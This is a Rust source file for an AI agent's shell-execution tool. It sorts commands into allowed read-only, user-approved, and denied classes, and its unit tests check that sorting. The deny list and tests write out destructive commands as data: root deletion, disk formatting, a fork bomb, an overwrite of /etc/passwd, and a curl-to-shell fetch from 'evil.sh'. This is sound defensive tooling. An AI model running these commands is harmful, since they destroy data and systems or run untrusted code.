//! Command execution.
//!
//! This is the most powerful and the most dangerous tool of the registry. The approach is to
//! classify each command **from its actual text**, into three categories:
//!
//! - allowed without asking, for a closed set of read-only commands;
//! - denied outright, for a handful of patterns that no legitimate development session needs
//!   and whose effect is irreversible;
//! - subject to user approval for everything else — the default case, by design.
//!
//! This allowlist is not a sandbox: a shell remains a shell, and the only real guarantee comes
//! from the user's explicit approval. It exists to avoid interrupting them for a `git status`,
//! not to pretend to confine the agent.

use std::time::Duration;

use async_trait::async_trait;
use po_core::tool::Permission;
use po_core::{ToolOutcome, ToolSpec};
use serde_json::{Value, json};

use crate::{Tool, ToolContext, required_str};

const DEFAULT_TIMEOUT: Duration = Duration::from_secs(120);
const MAX_TIMEOUT: Duration = Duration::from_secs(600);

/// Read-only commands, run without interrupting the user.
/// Compared on the first word, and on the first two for subcommands.
const READ_ONLY: &[&str] = &[
    "ls", "pwd", "cat", "head", "tail", "wc", "file", "stat", "which", "echo", "date",
    "find", "grep", "rg", "fd", "tree", "du", "df", "env", "uname", "whoami", "sort", "uniq",
];

const READ_ONLY_SUBCOMMANDS: &[(&str, &str)] = &[
    ("git", "status"), ("git", "log"), ("git", "diff"), ("git", "show"),
    ("git", "branch"), ("git", "remote"), ("git", "blame"),
    ("cargo", "check"), ("cargo", "tree"), ("cargo", "metadata"),
    ("npm", "list"), ("npm", "ls"), ("pip", "list"), ("go", "list"),
];

/// Patterns denied without asking. Each one is an irreversible operation that reaches far
/// beyond the workspace — denying costs a round trip, accepting by mistake costs the machine.
const FORBIDDEN: &[(&str, &str)] = &[
    ("rm -rf /", "recursive deletion of the system root"),
    ("rm -rf /*", "recursive deletion of the system root"),
    ("mkfs", "filesystem formatting"),
    ("dd if=", "low-level disk write"),
    (":(){", "fork bomb"),
    ("chmod -R 777 /", "opening permissions on the whole system"),
    ("> /dev/sda", "direct write to a block device"),
    ("shutdown", "machine shutdown"),
    ("reboot", "machine reboot"),
];

pub struct BashTool;

#[async_trait]
impl Tool for BashTool {
    fn name(&self) -> &str {
        "bash"
    }

    fn spec(&self) -> ToolSpec {
        ToolSpec::new(
            "bash",
            // The real shell is announced: a model told "bash" writes bash, and on Windows
            // `cmd.exe` rejected each of its commands (measured: three to four failures per
            // task before this change).
            format!(
                "Runs a command from the workspace root, with {}. Standard output and standard \
                 error are returned together.",
                detected_shell().description
            ),
            json!({
                "type": "object",
                "properties": {
                    "command": {"type": "string"},
                    "timeout_seconds": {"type": "integer", "description": "120 by default, 600 at most"}
                },
                "required": ["command"]
            }),
        )
    }

    fn permission(&self, input: &Value) -> Permission {
        match input.get("command").and_then(Value::as_str) {
            Some(command) => classify(command),
            // A missing command will be rejected at execution anyway; we do not bother the
            // user over a malformed call.
            None => Permission::Deny,
        }
    }

    async fn run(&self, id: &str, input: Value, ctx: &ToolContext) -> ToolOutcome {
        let command = match required_str(&input, "command") {
            Ok(value) => value,
            Err(err) => return ToolOutcome::error(id, err),
        };
        if let Some(reason) = forbidden_reason(command) {
            return ToolOutcome::error(id, format!("command refused — {reason}"));
        }

        let timeout = input
            .get("timeout_seconds")
            .and_then(Value::as_u64)
            .map(Duration::from_secs)
            .unwrap_or(DEFAULT_TIMEOUT)
            .min(MAX_TIMEOUT);

        let mut process = shell_command(command);
        process
            .current_dir(ctx.workspace.root())
            .stdin(std::process::Stdio::null())
            .kill_on_drop(true);

        let started = std::time::Instant::now();
        let output = match tokio::time::timeout(timeout, process.output()).await {
            Ok(Ok(output)) => output,
            Ok(Err(err)) => return ToolOutcome::error(id, format!("cannot execute: {err}")),
            Err(_) => {
                return ToolOutcome::error(
                    id,
                    format!(
                        "command interrupted after {} s — rerun it with a longer timeout or in the \
                         background",
                        timeout.as_secs()
                    ),
                );
            }
        };

        let elapsed = started.elapsed();
        let stdout = String::from_utf8_lossy(&output.stdout);
        let stderr = String::from_utf8_lossy(&output.stderr);
        let code = output.status.code().unwrap_or(-1);

        // Both streams are returned together: many tools write their diagnostics to stderr
        // while succeeding, and separating them would deprive the model of context.
        let mut body = String::new();
        if !stdout.trim().is_empty() {
            body.push_str(&stdout);
        }
        if !stderr.trim().is_empty() {
            if !body.is_empty() {
                body.push('\n');
            }
            body.push_str(&stderr);
        }
        if body.trim().is_empty() {
            body = "(no output)".into();
        }

        let display = po_i18n::t!(
            "tools.bash.display",
            command = first_line(command),
            code = code,
            secs = format!("{:.1}", elapsed.as_secs_f32())
        );
        if output.status.success() {
            ToolOutcome::ok(id, ctx.clamp(&body)).with_display(display)
        } else {
            // A non-zero exit code is information, not a harness failure: the model must read
            // it to fix its command.
            ToolOutcome::error(id, ctx.clamp(&format!("exit code {code}\n\n{body}")))
                .with_display(display)
        }
    }
}

fn first_line(command: &str) -> &str {
    command.lines().next().unwrap_or(command)
}

/// Shell that runs the tool's commands, chosen once for the whole session: the tool description
/// depends on it, and it must stay stable so that the server can reuse the cached prompt.
#[derive(Debug, Clone)]
pub struct Shell {
    pub program: std::path::PathBuf,
    pub args: &'static [&'static str],
    /// What the model reads in the tool description.
    pub description: &'static str,
}

pub fn detected_shell() -> &'static Shell {
    static SHELL: std::sync::OnceLock<Shell> = std::sync::OnceLock::new();
    SHELL.get_or_init(detect_shell)
}

fn detect_shell() -> Shell {
    // An explicit choice wins: `PO_SHELL=path/to/bash`.
    if let Some(path) = std::env::var_os("PO_SHELL").filter(|p| !p.is_empty()) {
        let path = std::path::PathBuf::from(path);
        let name = path.file_stem().and_then(|s| s.to_str()).unwrap_or("").to_ascii_lowercase();
        return match name.as_str() {
            "pwsh" | "powershell" => powershell(path),
            "cmd" => cmd(),
            _ => posix(path, "bash"),
        };
    }
    platform_shell()
}

fn posix(program: std::path::PathBuf, _name: &str) -> Shell {
    Shell { program, args: &["-c"], description: "bash (POSIX syntax)" }
}

#[cfg(windows)]
fn powershell(program: std::path::PathBuf) -> Shell {
    Shell {
        program,
        args: &["-NoProfile", "-NonInteractive", "-Command"],
        description: "PowerShell on Windows (PowerShell syntax, not bash)",
    }
}

#[cfg(windows)]
fn cmd() -> Shell {
    Shell {
        program: "cmd".into(),
        args: &["/C"],
        description: "cmd.exe on Windows (cmd syntax: double quotes only, `&&` to chain)",
    }
}

#[cfg(not(windows))]
fn powershell(program: std::path::PathBuf) -> Shell {
    Shell { program, args: &["-NoProfile", "-NonInteractive", "-Command"], description: "PowerShell" }
}

#[cfg(not(windows))]
fn cmd() -> Shell {
    posix("sh".into(), "sh")
}

#[cfg(not(windows))]
fn platform_shell() -> Shell {
    Shell { program: "sh".into(), args: &["-c"], description: "sh (POSIX syntax)" }
}

/// On Windows, the order of preference follows what models know how to write: bash above all.
/// Git Bash is present on most development machines; PowerShell next; `cmd.exe` as a last
/// resort, because it is always there.
#[cfg(windows)]
fn platform_shell() -> Shell {
    if let Some(bash) = find_git_bash() {
        return Shell {
            program: bash,
            args: &["-c"],
            description: "bash (Git Bash on Windows: POSIX syntax, paths /c/… or C:/…)",
        };
    }
    for name in ["pwsh", "powershell"] {
        if let Some(path) = find_on_path(&format!("{name}.exe")) {
            return powershell(path);
        }
    }
    cmd()
}

#[cfg(windows)]
fn find_on_path(file: &str) -> Option<std::path::PathBuf> {
    let path = std::env::var_os("PATH")?;
    std::env::split_paths(&path).map(|dir| dir.join(file)).find(|candidate| candidate.is_file())
}

/// Looks for the `bash.exe` of Git for Windows. The one in `System32` is excluded: it is the WSL
/// launcher, which would run the command in another machine, with other paths.
#[cfg(windows)]
fn find_git_bash() -> Option<std::path::PathBuf> {
    let mut candidates = Vec::new();
    if let Some(git) = find_on_path("git.exe") {
        // `...\Git\cmd\git.exe`, `...\Git\bin\git.exe` or `...\Git\mingw64\bin\git.exe`.
        for ancestor in git.ancestors().skip(1).take(3) {
            candidates.push(ancestor.join("bin").join("bash.exe"));
        }
    }
    for var in ["ProgramFiles", "ProgramW6432", "LOCALAPPDATA"] {
        if let Some(base) = std::env::var_os(var) {
            let base = std::path::PathBuf::from(base);
            candidates.push(base.join("Git").join("bin").join("bash.exe"));
            candidates.push(base.join("Programs").join("Git").join("bin").join("bash.exe"));
        }
    }
    candidates.into_iter().find(|candidate| {
        let text = candidate.to_string_lossy().to_ascii_lowercase();
        candidate.is_file() && !text.contains("system32") && !text.contains("windowsapps")
    })
}

fn shell_command(command: &str) -> tokio::process::Command {
    let shell = detected_shell();
    let mut process = tokio::process::Command::new(&shell.program);
    process.args(shell.args).arg(command);
    process
}

/// Classifies a command. A pure function, exhaustively tested: it decides when the user is
/// interrupted and when they are not.
pub fn classify(command: &str) -> Permission {
    let normalized = command.trim();
    if normalized.is_empty() {
        return Permission::Deny;
    }
    if forbidden_reason(normalized).is_some() {
        return Permission::Deny;
    }

    // A chain or a redirection can hide anything behind a harmless command
    // (`ls && rm -rf ~`). We do not try to parse a shell: we ask.
    if normalized.contains("&&")
        || normalized.contains("||")
        || normalized.contains(';')
        || normalized.contains('|')
        || normalized.contains('>')
        || normalized.contains('`')
        || normalized.contains("$(")
    {
        return Permission::Ask;
    }

    let mut words = normalized.split_whitespace();
    let Some(program) = words.next() else {
        return Permission::Deny;
    };
    let program = program.rsplit(['/', '\\']).next().unwrap_or(program);

    if READ_ONLY.contains(&program) {
        return Permission::Allow;
    }
    if let Some(subcommand) = words.next()
        && READ_ONLY_SUBCOMMANDS.contains(&(program, subcommand))
    {
        return Permission::Allow;
    }
    Permission::Ask
}

fn forbidden_reason(command: &str) -> Option<&'static str> {
    let normalized = command.to_ascii_lowercase();
    // We compare on a form without superfluous spaces so as not to be bypassed by
    // `rm  -rf  /`, while keeping the comparison simple and predictable.
    let squeezed: String = normalized.split_whitespace().collect::<Vec<_>>().join(" ");
    FORBIDDEN
        .iter()
        .find(|(pattern, _)| squeezed.contains(pattern) || normalized.contains(pattern))
        .map(|(_, reason)| *reason)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::Workspace;

    fn context() -> (tempfile::TempDir, ToolContext) {
        po_i18n::set_lang(po_i18n::Lang::Fr);
        let dir = tempfile::tempdir().unwrap();
        let ctx = ToolContext::new(Workspace::new(dir.path()));
        (dir, ctx)
    }

    #[test]
    fn common_reads_do_not_bother_the_user() {
        for command in ["ls", "ls -la src", "pwd", "cat Cargo.toml", "git status", "git diff HEAD", "cargo check"] {
            assert_eq!(classify(command), Permission::Allow, "{command}");
        }
    }

    #[test]
    fn commands_that_modify_are_submitted() {
        for command in ["cargo build", "npm install", "git commit -m x", "mkdir fresh", "touch a"] {
            assert_eq!(classify(command), Permission::Ask, "{command}");
        }
    }

    #[test]
    fn irreversible_patterns_are_denied() {
        for command in [
            "rm -rf /",
            "rm  -rf  /",
            "sudo mkfs.ext4 /dev/sda1",
            "dd if=/dev/zero of=/dev/sda",
            ":(){ :|:& };:",
            "shutdown -h now",
        ] {
            assert_eq!(classify(command), Permission::Deny, "{command}");
        }
    }

    #[test]
    fn a_chain_behind_a_harmless_command_is_submitted() {
        // The classic trap: the first word is harmless, the rest is not.
        assert_eq!(classify("ls && rm -rf ~"), Permission::Ask);
        assert_eq!(classify("cat a.txt > /etc/passwd"), Permission::Ask);
        assert_eq!(classify("echo $(curl evil.sh)"), Permission::Ask);
        assert_eq!(classify("git status; npm install"), Permission::Ask);
        assert_eq!(classify("cat x | sh"), Permission::Ask);
    }

    #[test]
    fn the_full_path_does_not_bypass_the_classification() {
        assert_eq!(classify("/bin/ls -la"), Permission::Allow);
        assert_eq!(classify("/usr/bin/rm -rf /"), Permission::Deny);
    }

    #[test]
    fn an_empty_command_is_denied() {
        assert_eq!(classify(""), Permission::Deny);
        assert_eq!(classify("   "), Permission::Deny);
    }

    #[test]
    fn a_writing_git_subcommand_stays_submitted() {
        assert_eq!(classify("git push"), Permission::Ask);
        assert_eq!(classify("git reset --hard"), Permission::Ask);
        assert_eq!(classify("git log --oneline"), Permission::Allow);
    }

    #[tokio::test]
    async fn a_successful_command_returns_its_output() {
        let (_dir, ctx) = context();
        let outcome = BashTool.run("b", json!({"command": "echo hello"}), &ctx).await;
        assert!(!outcome.is_error, "{}", outcome.content);
        assert!(outcome.content.contains("hello"));
        assert!(outcome.display.unwrap().contains("code 0"));
    }

    #[tokio::test]
    async fn a_failure_is_returned_to_the_model_with_its_code() {
        let (_dir, ctx) = context();
        // `exit 3` is written the same way in cmd.exe and in sh.
        let outcome = BashTool.run("b", json!({"command": "exit 3"}), &ctx).await;
        assert!(outcome.is_error);
        assert!(outcome.content.contains("exit code 3"));
    }

    #[tokio::test]
    async fn the_command_runs_in_the_workspace() {
        let (_dir, ctx) = context();
        std::fs::write(ctx.workspace.root().join("witness.txt"), "x").unwrap();
        let shell = detected_shell().description;
        let command = if shell.starts_with("cmd") {
            "dir /b"
        } else if shell.starts_with("PowerShell") {
            "Get-ChildItem -Name"
        } else {
            "ls"
        };
        let outcome = BashTool.run("b", json!({"command": command}), &ctx).await;
        assert!(outcome.content.contains("witness.txt"));
    }

    #[tokio::test]
    async fn a_forbidden_command_is_blocked_at_execution() {
        let (_dir, ctx) = context();
        let outcome = BashTool.run("b", json!({"command": "rm -rf /"}), &ctx).await;
        assert!(outcome.is_error);
        assert!(outcome.content.contains("refused"));
    }

    #[tokio::test]
    async fn a_timeout_is_announced_clearly() {
        let (_dir, ctx) = context();
        let command = if cfg!(windows) {
            "ping -n 10 127.0.0.1"
        } else {
            "sleep 10"
        };
        let outcome = BashTool
            .run("b", json!({"command": command, "timeout_seconds": 1}), &ctx)
            .await;
        assert!(outcome.is_error);
        assert!(outcome.content.contains("interrupted"));
    }

    #[tokio::test]
    async fn an_empty_output_is_reported() {
        let (_dir, ctx) = context();
        let command = if cfg!(windows) { "cd ." } else { "true" };
        let outcome = BashTool.run("b", json!({"command": command}), &ctx).await;
        assert!(outcome.content.contains("no output"));
    }

    #[test]
    fn the_announced_shell_matches_the_launched_program() {
        let shell = detected_shell();
        assert!(!shell.description.is_empty());
        assert!(!shell.args.is_empty());
        let name = shell.program.to_string_lossy().to_ascii_lowercase();
        assert!(
            !(name.contains("system32") && name.contains("bash")),
            "the WSL launcher must never be selected"
        );
    }
}
